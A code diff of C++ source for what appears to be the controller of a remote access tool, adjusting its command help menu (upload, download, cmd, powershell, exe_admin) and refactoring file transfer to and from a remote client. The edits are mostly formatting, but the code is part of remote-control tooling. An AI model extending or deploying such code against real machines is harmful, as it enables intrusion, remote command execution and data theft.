@@ -10,11 +10,11 @@ void Info::list_scripts()
 
 	print_status("[ pwd\t\t\t\t\t: Print the current path");
 	print_status("[ ls\t\t\t\t\t: List all files and folders in the current directory");
-	print_status("[ getTemp\t\t\t\t: Get the location of the temp directory");
-	print_status("[ upload \"filename\"\t\t\t: Upload a file in the current directory");
+	print_status("[ getTemp\t\t\t\t\t: Get the location of the temp directory");
+	print_status("[ upload \"filename\"\t\t\t\t: Upload a file in the current directory");
 	print_status("[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory");
 	print_status("[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)");
-	print_status("[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED");
+	print_status("[ download_dir \"filename\"\t\t\t: Download the target directory   ------NOT IMPLEMENTED");
 
 	print_warning("#----------------------------- System commands ----------------------------#");
 
@@ -29,7 +29,7 @@ void Info::list_scripts()
 	print_status("[ cmd <command>\t\t\t\t: Run a command using cmd");
 	print_status("[ powershell <command>\t\t\t:Run a command using powershell");
 	print_status("[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode");
-	print_status("[ exe <file_name>\t\t\t: Execute a file");
+	print_status("[ exe <file_name>\t\t\t\t: Execute a file");
 
 	print_warning("#-------------------------------- Exploit ----------------------------------#");
 
@@ -123,9 +123,10 @@ void SetColor(int value)
 	*/
 }
 #endif
+
 void Transfer::uploadToClient(Server* serv1,SOCKET cl_sock, const std::string filename)
 {
-	std::cout << "[*] Starting the upload of : " << filename << std::endl;
+	print_status("Starting the upload of : "+ filename );
 	char buffer[BUFFER_LEN] = { 0 };
 
 	std::ifstream file(filename, std::ios::binary | std::ios::in);
@@ -175,15 +176,18 @@ void Transfer::uploadToClient(Server* serv1,SOCKET cl_sock, const std::string fi
 	else
 	{
 		serv1->send_b("STOP");
-		std::cout << "[*] Error can\'t open file : " << filename << std::endl;
+		print_error("Error can\'t open file : "+filename);
 	}
 }
-void Transfer::downloadFromClient(Server* serv1,SOCKET cl_sock, const std::string filename)
+void Transfer::downloadFromClient(Server* serv1, const std::string filename)
 {	
 	char buffer[BUFFER_LEN] = { 0 };
+	SOCKET cl_sock = serv1->getDefaultClient().sock;
 
 	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE
+
 	const unsigned int size = atoi(buffer);
+	std::cout << "SIZE : " << size << " buffer : "<< buffer << std::endl;
 	print_status(std::to_string(size) + " bytes to download");
 
 	std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);
@@ -196,9 +200,12 @@ void Transfer::downloadFromClient(Server* serv1,SOCKET cl_sock, const std::strin
 		int current_size = 0;
 		char memblock[len] = { 0 };
 		const int rest = size % len;
+
 		std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+		
 		int pourcentage = 0;
 		bool done = 0;
+
 		std::thread t_refresh(refresh, &done, 200, &pourcentage);
 
 		while (current_size != size || std::string(memblock) == "STOP")
